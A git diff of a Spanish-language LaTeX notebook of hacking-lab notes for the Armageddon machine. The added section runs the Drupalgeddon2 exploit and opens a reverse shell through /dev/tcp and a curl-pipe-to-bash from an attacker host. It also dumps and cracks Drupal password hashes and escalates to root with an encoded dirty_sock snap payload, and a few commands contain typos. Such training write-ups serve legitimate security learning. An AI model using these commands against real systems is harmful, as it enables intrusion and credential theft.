@@ -119,7 +119,7 @@
 \title{2021 - S4viNotes}
 \author{Lo0pInG 404}
 % The month and year that you submit your FINAL draft TO THE LIBRARY (May or December)
-\date{updated on 2021-07-24}
+\date{updated on 2021-07-25}
 \division{}
 \unitname{}{}{}
 \advisor{}
@@ -206,7 +206,8 @@
     
     Este es el Notebook de los lives en Twitch del tito S4vitar. Aqui podreis encontrar los passos impotantes de cada maquina
     echa. Este book no tiene que estar considerado como una lista de Walktrough, pero mas como unas notas de technicas utilizadas
-    durante la resolucion de maquinas.
+    durante la resolucion de maquinas. Por cierto no estara listado los passwords o algun usuarios, menos si estan utilizados en
+    commandos.
     
     Cada maquina esta separada de la manera siguiente:
     
@@ -226,12 +227,15 @@
     
     Espero que este book ayude a la comunidad.
     
+    Todas las notas estan disponibles separadas por typos y categorias en el \href{https://looping404.michellopez.org}{hacking Notebook}.
+    
     \hypertarget{acknoledgement}{%
     \subsection*{Acknoledgement}\label{acknoledgement}}
     \addcontentsline{toc}{subsection}{Acknoledgement}
     
-    Por cierto, me gustaria dar las gracias a S4vitar por su contenido de calidad y las ganas que mete a lo que hace para la comunidad.
-    Son estas ganas que me motivaron en querer aprender mas y mas.
+    Me gustaria dar las gracias a S4vitar por su contenido de calidad y las ganas que mete a lo que hace para la comunidad.
+    Son estas ganas que me motivaron en querer aprender mas y mas. Y como la mejor manera que tengo de aprender es tomando notas,
+    este book no existiria sin el.
   \end{resume}
 
 
@@ -258,7 +262,8 @@
 
 Este es el Notebook de los lives en Twitch del tito S4vitar. Aqui podreis encontrar los passos impotantes de cada maquina
 echa. Este book no tiene que estar considerado como una lista de Walktrough, pero mas como unas notas de technicas utilizadas
-durante la resolucion de maquinas.
+durante la resolucion de maquinas. Por cierto no estara listado los passwords o algun usuarios, menos si estan utilizados en
+commandos.
 
 Cada maquina esta separada de la manera siguiente:
 
@@ -278,12 +283,15 @@ Cada maquina esta separada de la manera siguiente:
 
 Espero que este book ayude a la comunidad.
 
+Todas las notas estan disponibles separadas por typos y categorias en el \href{https://looping404.michellopez.org}{hacking Notebook}.
+
 \hypertarget{acknoledgement-1}{%
 \section*{Acknoledgement}\label{acknoledgement-1}}
 \addcontentsline{toc}{section}{Acknoledgement}
 
-Por cierto, me gustaria dar las gracias a S4vitar por su contenido de calidad y las ganas que mete a lo que hace para la comunidad.
-Son estas ganas que me motivaron en querer aprender mas y mas.
+Me gustaria dar las gracias a S4vitar por su contenido de calidad y las ganas que mete a lo que hace para la comunidad.
+Son estas ganas que me motivaron en querer aprender mas y mas. Y como la mejor manera que tengo de aprender es tomando notas,
+este book no existiria sin el.
 
 \hypertarget{olympus}{%
 \chapter*{Olympus}\label{olympus}}
@@ -1345,9 +1353,9 @@ Ya estamos root y seguimos mas hack que nunca.
 \section*{Introduccion}\label{introduccion-2}}
 \addcontentsline{toc}{section}{Introduccion}
 
-La maquina del dia 22/07/2021 se llama Armageddon.
+La maquina del dia 24/07/2021 se llama Armageddon.
 
-El replay del live se puede ver en \href{https://www.twitch.tv/videos/1094808182}{Twitch: S4vitaar Olympus maquina}
+El replay del live se puede ver en \href{https://www.twitch.tv/videos/1096891939}{Twitch: S4vitaar Olympus maquina}
 
 \hypertarget{enumeracion-2}{%
 \section*{Enumeracion}\label{enumeracion-2}}
@@ -1381,15 +1389,27 @@ ttl: 63 -\textgreater{} maquina linux
 \end{Highlighting}
 \end{Shaded}
 
+\begin{itemize}
+\tightlist
+\item
+  Drupal 7
+\end{itemize}
+
 \begin{longtable}[]{@{}llll@{}}
 \toprule
 Puerto & Servicio & Que se nos occure? & Que falta?\tabularnewline
 \midrule
 \endhead
 22 & ssh & Accesso directo & usuario y contraseña\tabularnewline
-80 & http & Drupal-armageddon (drupalgeddon) & Checkear el exploit\tabularnewline
+80 & http & Drupal-armageddon (drupalgeddon2) & Checkear el exploit\tabularnewline
 \bottomrule
 \end{longtable}
+
+\hypertarget{browsear-la-web-2}{%
+\subsubsection*{Browsear la web}\label{browsear-la-web-2}}
+\addcontentsline{toc}{subsubsection}{Browsear la web}
+
+Nada interessante.
 
 \hypertarget{vulnerability-assessment-2}{%
 \section*{Vulnerability Assessment}\label{vulnerability-assessment-2}}
@@ -1399,17 +1419,93 @@ Puerto & Servicio & Que se nos occure? & Que falta?\tabularnewline
 \subsection*{Druppalgeddon}\label{druppalgeddon}}
 \addcontentsline{toc}{subsection}{Druppalgeddon}
 
-\textbf{Druppalgeddon2} es un exploit creado por Hans Topo y g0tmi1k escrito en ruby.
+\textbf{Druppalgeddon2} es un exploit creado por Hans Topo y g0tmi1k escrito en ruby que approvecha de vulnerabilidades
+de drupal y que directamente nos daria una shell.
 
 \begin{Shaded}
 \begin{Highlighting}[]
-\ExtensionTok{ruby}\NormalTok{ drupalggedon2.rb 10.10.10.233}
+\FunctionTok{git}\NormalTok{ clone https://github.com/dreadlocked/Drupalgeddon2}
+\BuiltInTok{cd}\NormalTok{ Drupalgeddon2}
+\FunctionTok{cat}\NormalTok{ drupalgeddon2.rb}
+\ExtensionTok{ruby}\NormalTok{ drupalgeddon2.rb}
 \end{Highlighting}
 \end{Shaded}
 
 \hypertarget{vuln-exploit-gaining-access-2}{%
 \section*{Vuln exploit \& Gaining Access}\label{vuln-exploit-gaining-access-2}}
 \addcontentsline{toc}{section}{Vuln exploit \& Gaining Access}
+
+\hypertarget{druppalgeddon-1}{%
+\subsection*{Druppalgeddon}\label{druppalgeddon-1}}
+\addcontentsline{toc}{subsection}{Druppalgeddon}
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\ExtensionTok{ruby}\NormalTok{ druppalgeddon2.rb 10.10.10.233}
+\FunctionTok{whoami}
+\CommentTok{#Output}
+\OperatorTok{>} \ExtensionTok{apache}
+\ExtensionTok{ifconfig}
+\CommentTok{#Output}
+\OperatorTok{>} \ExtensionTok{10.10.10.233}
+\end{Highlighting}
+\end{Shaded}
+
+Entablamos ahora una reverse shell para sacarse de este contexto.
+
+\begin{enumerate}
+\def\labelenumi{\arabic{enumi}.}
+\item
+  maquina de attackante
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\ExtensionTok{nc}\NormalTok{ -nlvp 443}
+\end{Highlighting}
+\end{Shaded}
+\item
+  druppalgeddon2 shell
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\FunctionTok{bash}\NormalTok{ -i }\OperatorTok{>}\KeywordTok{&} \ExtensionTok{/dev/tcp/10.10.14.20/443} \OperatorTok{0>&1}
+\end{Highlighting}
+\end{Shaded}
+\end{enumerate}
+
+Esto no functiona porque le commando contiene \textbf{bad chars}. Como la maquina no tiene \textbf{nc} ni \textbf{ncat} la tecnica seria la siguiente:
+
+\begin{enumerate}
+\def\labelenumi{\arabic{enumi}.}
+\item
+  Creamos un archivo \emph{index.html} que contiene
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\NormalTok{#!/bin/bash}
+
+\NormalTok{bash -i >}\ErrorTok{&}\NormalTok{ /dev/tcp/10.10.14.20/443 0>}\ErrorTok{&}\NormalTok{1}
+\end{Highlighting}
+\end{Shaded}
+\item
+  Compartimos un servidor web con \emph{python}
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\ExtensionTok{python3}\NormalTok{ -m http.server 80}
+\end{Highlighting}
+\end{Shaded}
+\item
+  En la drupalgeddon2 shell
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\ExtensionTok{curl}\NormalTok{ -s 10.10.14.20 }\KeywordTok{|} \FunctionTok{bash}
+\end{Highlighting}
+\end{Shaded}
+\end{enumerate}
+
+ya esta\ldots{}
 
 \hypertarget{tratamiento-de-la-tty-2}{%
 \subsection*{Tratamiento de la TTY}\label{tratamiento-de-la-tty-2}}
@@ -1419,17 +1515,10 @@ Puerto & Servicio & Que se nos occure? & Que falta?\tabularnewline
 \begin{Highlighting}[]
 \ExtensionTok{script}\NormalTok{ /dev/null -c bash}
 \NormalTok{^}\ExtensionTok{Z}
-\FunctionTok{stty}\NormalTok{ raw -echo}\KeywordTok{;} \BuiltInTok{fg}
-\ExtensionTok{-}\OperatorTok{>}\NormalTok{ reset}
-\ExtensionTok{-}\OperatorTok{>}\NormalTok{ xterm}
-\BuiltInTok{export} \VariableTok{TERM=}\NormalTok{xterm}
-\BuiltInTok{export} \VariableTok{SHELL=}\NormalTok{bash}
-
-\FunctionTok{stty}\NormalTok{ -a}
-
-\FunctionTok{stty}\NormalTok{ rows }\OperatorTok{<}\NormalTok{rownb}\OperatorTok{>}\NormalTok{ columns }\OperatorTok{<}\NormalTok{colnb}\OperatorTok{>}
 \end{Highlighting}
 \end{Shaded}
+
+En este caso no nos va el tratamiento de la \textbf{TTY}. En este caso lo que hacemos es utilizar el \texttt{rlwrap\ nc\ -nlvp\ 443}
 
 \hypertarget{investigamos-la-maquina-1}{%
 \subsection*{Investigamos la maquina}\label{investigamos-la-maquina-1}}
@@ -1437,15 +1526,105 @@ Puerto & Servicio & Que se nos occure? & Que falta?\tabularnewline
 
 \begin{Shaded}
 \begin{Highlighting}[]
-\BuiltInTok{cd}\NormalTok{ /home}
+\BuiltInTok{pwd}
 \CommentTok{#Output}
-\ExtensionTok{zeus}
+\ExtensionTok{/var/www/html}
 
-\FunctionTok{ls}\NormalTok{ /home/zeus}
+\FunctionTok{ls}\NormalTok{ -l}
 \CommentTok{#Output}
-\ExtensionTok{airgeddon}
+\ExtensionTok{muchas}\NormalTok{ cosas}
+
+\FunctionTok{grep}\NormalTok{ -r -E -i }\StringTok{"user|pass|key"}
+\CommentTok{#Output}
+\ExtensionTok{muchas}\NormalTok{ cosas}
+
+\FunctionTok{grep}\NormalTok{ -r -E -i }\StringTok{"username|pass|key"}
+\CommentTok{#Output}
+\ExtensionTok{muchas}\NormalTok{ cosas}
 \end{Highlighting}
 \end{Shaded}
+
+Como hay muchas cosas y es difficil de analizar usamos el commando \texttt{find} y vamos quitando con el commando \texttt{grep\ -v} las cosas que no
+nos interressan poco a poco.
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\FunctionTok{find}\NormalTok{ \textbackslash{}-type -f }\OperatorTok{2>}\NormalTok{/dev/null}
+\FunctionTok{find}\NormalTok{ \textbackslash{}-type -f }\OperatorTok{2>}\NormalTok{/dev/null }\KeywordTok{|} \FunctionTok{grep}\NormalTok{ -v }\StringTok{"themes"}
+\FunctionTok{find}\NormalTok{ \textbackslash{}-type -f }\OperatorTok{2>}\NormalTok{/dev/null }\KeywordTok{|} \FunctionTok{grep}\NormalTok{ -v -E }\StringTok{"themes|modules"}
+\end{Highlighting}
+\end{Shaded}
+
+Ahora ya se puede investigar manualmente. Apuntamos los recursos que parecen interessantes.
+
+\begin{itemize}
+\tightlist
+\item
+  authorize.php
+\item
+  cron.php
+\item
+  includes/database
+\item
+  includes/password.inc
+\item
+  sites/default/
+\end{itemize}
+
+Lo miramos hasta que encontremos cosas interessantes. En un fichero encontramos un user \textbf{drupaluser} y su contraseña.
+
+Miramos los usuarios de la maquina
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\FunctionTok{grep} \StringTok{"sh$"}\NormalTok{ /etc/passwd}
+\CommentTok{#Output}
+\ExtensionTok{root}
+\ExtensionTok{brucetherealadmin}
+\end{Highlighting}
+\end{Shaded}
+
+Como el servicio ssh esta abierto miramos si la contraseña functiona con el usuario brucetherealadmin pero no functiona.
+
+Como hemos visto ficheros \emph{mysql} intentamos connectar con el \textbf{drupaluser} y functiona.
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\ExtensionTok{mysql}\NormalTok{ -u }\StringTok{'drupaluser'}\NormalTok{ -p }\StringTok{"SLKDENkldajsn!!$"}\NormalTok{ -e }\StringTok{'show databases;'}
+\ExtensionTok{mysql}\NormalTok{ -u }\StringTok{'drupaluser'}\NormalTok{ -p }\StringTok{"SLKDENkldajsn!!$"}\NormalTok{ -e }\StringTok{'use drupal; show tables;'}
+\ExtensionTok{mysql}\NormalTok{ -u }\StringTok{'drupaluser'}\NormalTok{ -p }\StringTok{"SLKDENkldajsn!!$"}\NormalTok{ -e }\StringTok{'use drupal; describe users;'}
+\ExtensionTok{mysql}\NormalTok{ -u }\StringTok{'drupaluser'}\NormalTok{ -p }\StringTok{"SLKDENkldajsn!!$"}\NormalTok{ -e }\StringTok{'use drupal; select name,pass from users;'}
+\end{Highlighting}
+\end{Shaded}
+
+Encontramos el usuario `brucetherealadmin' y su contraseña encryptada.
+
+\hypertarget{john-1}{%
+\subsection*{John}\label{john-1}}
+\addcontentsline{toc}{subsection}{John}
+
+\begin{enumerate}
+\def\labelenumi{\arabic{enumi}.}
+\tightlist
+\item
+  copiamos el hash en un fichero llamado \texttt{hash}
+\item
+  john --wordlist=/usr/share/wordlists/rockyout.txt hash
+\end{enumerate}
+
+Ya tenemos contraseña para el usuario \emph{brucetherealadmin}
+
+\hypertarget{ssh}{%
+\subsection*{SSH}\label{ssh}}
+\addcontentsline{toc}{subsection}{SSH}
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\FunctionTok{ssh}\NormalTok{ brucetherealadmin@10.10.10.233}
+\end{Highlighting}
+\end{Shaded}
+
+ya tenemos la flag user.txt
 
 \hypertarget{privilege-escalation-2}{%
 \section*{Privilege Escalation}\label{privilege-escalation-2}}
@@ -1459,6 +1638,65 @@ Puerto & Servicio & Que se nos occure? & Que falta?\tabularnewline
 \begin{Highlighting}[]
 \FunctionTok{whoami}
 \FunctionTok{id}
+\FunctionTok{sudo}\NormalTok{ -l}
+\end{Highlighting}
+\end{Shaded}
+
+Vemos que podemos lanzar snap como root.
+
+Buscamos en google snap hook exploit .snap file y encontramos el link siguiente
+\href{https://initblog.com/2019/dirty-sock/}{Linux Privilege Escalation via snapd (dirty\_sock exploit)}. Econtramos
+un hook que genera un nuevo local user. Lo miramos y lo reutilizamos usando python.
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\BuiltInTok{echo} \StringTok{"aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/}
+\StringTok{/////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh}
+\StringTok{ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5}
+\StringTok{TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo}
+\StringTok{T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl}
+\StringTok{Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt}
+\StringTok{ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv}
+\StringTok{ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n}
+\StringTok{L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt}
+\StringTok{b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe}
+\StringTok{rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj}
+\StringTok{rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA}
+\StringTok{AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2}
+\StringTok{XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5}
+\StringTok{RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA}
+\StringTok{AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw"} \KeywordTok{|} \FunctionTok{xargs} \KeywordTok{|} \FunctionTok{tr}\NormalTok{ -d }\StringTok{' '}
+\end{Highlighting}
+\end{Shaded}
+
+copiamos el output y recreamos el paquete snap malicioso
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\BuiltInTok{cd}\NormalTok{ /tmp}
+\ExtensionTok{pytho}\NormalTok{ -c }\StringTok{'print "aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD}
+\StringTok{//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29}
+\StringTok{jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1}
+\StringTok{EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2Q}
+\StringTok{gLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N}
+\StringTok{1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciB}
+\StringTok{leHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiA}
+\StringTok{gJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAA}
+\StringTok{BaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3F}
+\StringTok{qfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4}
+\StringTok{wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRj}
+\StringTok{NEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPt}
+\StringTok{vjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAA}
+\StringTok{AAAAAPgMAAAAAAAAEgAAAAACAA" + "A"*4256 + "=="'} \KeywordTok{|} \ExtensionTok{base64}\NormalTok{ -d }\OperatorTok{>}\NormalTok{ setenso.snap}
+
+\FunctionTok{sudo}\NormalTok{ /usr/bin/snap install setenso.snap --devmode}
+\FunctionTok{cat}\NormalTok{ /etc/passwd}
+\FunctionTok{sudo}\NormalTok{ dirty_sock }\OperatorTok{>}\NormalTok{ password dirty_sock}
+\FunctionTok{sudo}\NormalTok{ su }\OperatorTok{>}\NormalTok{ password dirty_sock}
+
+\FunctionTok{whoami}
+\CommentTok{#Output}
+\ExtensionTok{root}
 \end{Highlighting}
 \end{Shaded}
 
